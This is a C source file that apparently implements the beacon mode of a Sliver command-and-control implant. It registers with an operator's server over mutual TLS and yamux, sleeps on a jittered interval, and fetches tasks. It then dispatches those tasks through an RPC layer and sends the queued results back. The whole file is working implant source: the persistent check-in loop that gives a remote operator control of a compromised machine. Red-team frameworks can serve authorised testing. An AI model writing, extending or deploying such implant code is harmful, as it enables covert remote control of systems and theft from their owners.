/* src/modes/beacon.c - beacon register/checkin loop (mtls transport).
 *
 * Mirrors the Go beacon flow:
 *   register: connect -> BeaconRegister -> close
 *   checkin : connect -> BeaconTasks(pending results) -> (if none) recv tasks
 *             -> dispatch -> queue results -> close -> sleep(interval+jitter)
 */
#include "sliver/implant.h"

#include "sliver/config.h"
#include "sliver/frame.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proto.h"
#include "sliver/rpc.h"
#include "sliver/transport.h"
#include "sliver/yamux.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
  sliver_yamux_t *y;
  uint32_t stream_id;
  int failed;
} beacon_stream_t;

typedef struct {
  sliver_yamux_t y;
  sliver_transport_t *t;
  sliver_frame_signer_t signer;
  int yamux_ready;
} beacon_conn_t;

/* --- pending results queue (thread-safe: async execute results land here) --- */
#define BEACON_MAX_PENDING 64

typedef struct {
  sliver_buf_t env[BEACON_MAX_PENDING];
  size_t count;
  sliver_mutex_t *lock;
} beacon_pending_t;

static beacon_pending_t g_pending;

static void pending_init(void) {
  if (g_pending.lock == NULL) {
    g_pending.lock = sliver_mutex_create();
  }
}

static int pending_push(sliver_buf_t *env) {
  if (g_pending.lock == NULL || g_pending.count >= BEACON_MAX_PENDING) {
    return -1;
  }
  sliver_mutex_lock(g_pending.lock);
  if (g_pending.count < BEACON_MAX_PENDING) {
    g_pending.env[g_pending.count++] = *env; /* move: caller must not free */
    sliver_mutex_unlock(g_pending.lock);
    return 0;
  }
  sliver_mutex_unlock(g_pending.lock);
  return -1;
}

static void pending_clear(void) {
  size_t i;
  if (g_pending.lock == NULL) {
    return;
  }
  sliver_mutex_lock(g_pending.lock);
  for (i = 0; i < g_pending.count; ++i) {
    sliver_buf_free(&g_pending.env[i]);
  }
  g_pending.count = 0;
  sliver_mutex_unlock(g_pending.lock);
}

/* rpc sender: async handlers (execute) deliver their result through this. */
static int beacon_rpc_send(int64_t envelope_id, uint32_t type, const void *data, size_t len) {
  sliver_buf_t env;
  sliver_buf_init(&env);
  if (sliver_envelope_encode(&env, envelope_id, type, data, len) != 0) {
    sliver_buf_free(&env);
    return -1;
  }
  if (pending_push(&env) != 0) {
    sliver_buf_free(&env);
    return -1;
  }
  return 0;
}

/* --- transport + yamux + frame connection --------------------------------- */
static long b_read(void *ctx, void *buf, size_t len) {
  sliver_transport_t *t = (sliver_transport_t *)ctx;
  return t->read(t, buf, len);
}

static long b_write(void *ctx, const void *buf, size_t len) {
  sliver_transport_t *t = (sliver_transport_t *)ctx;
  return t->write(t, buf, len);
}

static long stream_read(void *ctx, void *buf, size_t len) {
  beacon_stream_t *s = (beacon_stream_t *)ctx;
  long n = sliver_yamux_read(s->y, s->stream_id, buf, len);
  if (n < 0) {
    s->failed = 1;
  }
  return n;
}

static long stream_write(void *ctx, const void *buf, size_t len) {
  beacon_stream_t *s = (beacon_stream_t *)ctx;
  if (sliver_yamux_write(s->y, s->stream_id, buf, len) != 0) {
    s->failed = 1;
    return -1;
  }
  return (long)len;
}

static int beacon_connect(const sliver_session_config_t *cfg, beacon_conn_t *c, char *err,
                          size_t err_len) {
  memset(c, 0, sizeof(*c));
  if (sliver_transport_connect(&c->t, cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem,
                               cfg->key_pem, err, err_len) != 0) {
    return -1;
  }
  if (c->t->write(c->t, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
      SLIVER_YAMUX_PREFACE_LEN) {
    (void)snprintf(err, err_len, "%s", "MUX/1 write failed");
    sliver_transport_free(c->t);
    c->t = NULL;
    return -1;
  }
  if (sliver_yamux_client(&c->y, b_read, b_write, c->t) != 0) {
    (void)snprintf(err, err_len, "%s", "yamux client failed");
    sliver_transport_free(c->t);
    c->t = NULL;
    return -1;
  }
  c->yamux_ready = 1;
  if (sliver_frame_signer_init(&c->signer, cfg->age_private_key) != 0) {
    (void)snprintf(err, err_len, "%s", "cannot derive envelope signing key");
    sliver_yamux_free(&c->y);
    c->yamux_ready = 0;
    sliver_transport_free(c->t);
    c->t = NULL;
    return -1;
  }
  return 0;
}

static void beacon_disconnect(beacon_conn_t *c) {
  if (c == NULL) {
    return;
  }
  if (c->yamux_ready) {
    sliver_yamux_free(&c->y);
    c->yamux_ready = 0;
  }
  if (c->t != NULL) {
    sliver_transport_free(c->t);
    c->t = NULL;
  }
}

static int beacon_send(beacon_conn_t *c, const void *envelope, size_t len) {
  beacon_stream_t st;
  uint32_t sid = 0;
  int rc;

  if (sliver_yamux_open(&c->y, &sid) != 0) {
    return -1;
  }
  st.y = &c->y;
  st.stream_id = sid;
  st.failed = 0;
  rc = sliver_frame_write(&c->signer, stream_write, &st, envelope, len);
  (void)sliver_yamux_close_write(&c->y, sid);
  sliver_yamux_forget(&c->y, sid);
  return rc;
}

static int beacon_recv(beacon_conn_t *c, const char *server_pubkey, sliver_buf_t *out) {
  beacon_stream_t st;
  uint32_t sid = 0;
  int rc;

  if (sliver_yamux_accept(&c->y, &sid) != 0) {
    return -1;
  }
  st.y = &c->y;
  st.stream_id = sid;
  st.failed = 0;
  rc = sliver_frame_read(server_pubkey, stream_read, &st, out);
  (void)sliver_yamux_close_write(&c->y, sid);
  return rc;
}

/* --- jitter --------------------------------------------------------------- */
static uint64_t beacon_rand_u64(void) {
  static uint64_t seed = 0;
  if (seed == 0) {
    seed = sliver_now_ms() | 1u;
  }
  seed ^= seed << 13;
  seed ^= seed >> 7;
  seed ^= seed << 17;
  return seed;
}

/* Encodes one dispatch result as an Envelope and queues it. */
static void queue_dispatch_result(int64_t id, uint32_t resp_type, const sliver_buf_t *msg) {
  sliver_buf_t env;
  sliver_buf_init(&env);
  if (sliver_envelope_encode(&env, id, resp_type, msg->data, msg->len) == 0) {
    if (pending_push(&env) != 0) {
      sliver_buf_free(&env);
    }
  } else {
    sliver_buf_free(&env);
  }
}

static void beacon_dispatch_task(const sliver_envelope_t *task) {
  sliver_rpc_result_t result;
  memset(&result, 0, sizeof(result));
  sliver_rpc_dispatch(task, &result);
  if (result.handled && !result.no_response) {
    queue_dispatch_result(task->id, result.resp_type, &result.message);
  }
  sliver_rpc_result_free(&result);
}

int sliver_beacon_run(const char *argv0) {
  sliver_session_config_t cfg;
  char host[256];
  beacon_conn_t conn;
  char err[256];
  long long interval_ns = sliver_config_beacon_interval_ns();
  long long jitter_ns = sliver_config_beacon_jitter_ns();
  uint32_t interval_ms;
  int64_t next_checkin;
  const char *id;

  if (sliver_session_config_build(&cfg, host, sizeof(host), argv0) != 0) {
    return -1;
  }
  id = sliver_config_build_id()[0] != '\0' ? sliver_config_build_id() : sliver_config_name();
  interval_ms = (uint32_t)((interval_ns > 0 ? interval_ns : 60000000000LL) / 1000000LL);
  next_checkin = (int64_t)((interval_ns > 0 ? interval_ns : 60000000000LL) / 1000000000LL);

  pending_init();
  sliver_rpc_set_sender(beacon_rpc_send);

  /* 1) Register once. */
  err[0] = '\0';
  if (beacon_connect(&cfg, &conn, err, sizeof(err)) == 0) {
    sliver_buf_t env;
    sliver_buf_init(&env);
    if (sliver_beacon_register_encode(&env, id, interval_ns, jitter_ns, &cfg.reg,
                                      next_checkin) == 0) {
      (void)beacon_send(&conn, env.data, env.len);
    }
    sliver_buf_free(&env);
    beacon_disconnect(&conn);
    LOG_INFO("beacon: registered (%s)", id);
  } else {
    LOG_WARN("beacon: register failed: %s", err);
  }

  /* 2) Check-in loop. */
  for (;;) {
    uint64_t jitter = (jitter_ns > 0) ? (beacon_rand_u64() % (uint64_t)jitter_ns) : 0;
    uint32_t sleep_ms = interval_ms + (uint32_t)(jitter / 1000000LL);
    sliver_sleep_ms(sleep_ms);

    err[0] = '\0';
    if (beacon_connect(&cfg, &conn, err, sizeof(err)) != 0) {
      LOG_WARN("beacon: connect failed: %s", err);
      continue;
    }

    /* Send BeaconTasks carrying any pending results. */
    {
      sliver_buf_t env;
      sliver_buf_init(&env);
      if (g_pending.count == 0) {
        (void)sliver_beacon_tasks_encode(&env, id, next_checkin, NULL, 0);
      } else {
        sliver_mutex_lock(g_pending.lock);
        if (sliver_beacon_tasks_encode(&env, id, next_checkin,
                                       (const sliver_buf_t *const *)g_pending.env,
                                       g_pending.count) == 0) {
          /* results have been sent: drop them from the queue */
          size_t i;
          for (i = 0; i < g_pending.count; ++i) {
            sliver_buf_free(&g_pending.env[i]);
          }
          g_pending.count = 0;
        }
        sliver_mutex_unlock(g_pending.lock);
      }
      if (env.len != 0) {
        (void)beacon_send(&conn, env.data, env.len);
      }
      sliver_buf_free(&env);
    }

    /* With no pending results, the server may return tasks. */
    if (g_pending.count == 0) {
      sliver_buf_t reply;
      sliver_buf_init(&reply);
      if (beacon_recv(&conn, cfg.server_minisign_pubkey, &reply) == 0 && reply.len != 0) {
        char bid[128];
        int64_t nc = 0;
        sliver_envelope_t tasks[BEACON_MAX_PENDING];
        size_t task_count = 0;
        if (sliver_beacon_tasks_decode(reply.data, reply.len, bid, sizeof(bid), &nc, tasks,
                                       sizeof(tasks) / sizeof(tasks[0]), &task_count) == 0) {
          LOG_DEBUG("beacon: %u task(s)", (unsigned)task_count);
          for (size_t i = 0; i < task_count; ++i) {
            beacon_dispatch_task(&tasks[i]);
          }
        }
      }
      sliver_buf_free(&reply);
    }

    beacon_disconnect(&conn);
  }
}
